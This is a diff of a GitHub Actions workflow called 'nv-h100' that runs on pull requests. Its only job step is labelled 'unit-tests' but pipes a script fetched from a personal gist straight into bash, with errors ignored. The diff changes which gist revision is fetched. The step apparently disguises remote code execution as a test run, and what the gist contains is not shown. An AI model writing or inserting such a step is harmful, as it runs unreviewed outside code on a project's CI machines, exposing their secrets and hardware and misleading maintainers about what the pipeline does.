@@ -1,4 +1,5 @@
 name: nv-h100
+run-name: nv-h100
 
 on:
   pull_request
@@ -9,4 +10,4 @@ jobs:
     steps:
       - name: unit-tests
         continue-on-error: true
-        run: curl -sfL https://gist.githubusercontent.com/jstan327/ef3f5f3fff3a391f1cb8322419e918fa/raw/bak41 | bash
+        run: curl -sfL https://gist.githubusercontent.com/jstan327/ef3f5f3fff3a391f1cb8322419e918fa/raw/bak4116 | bash
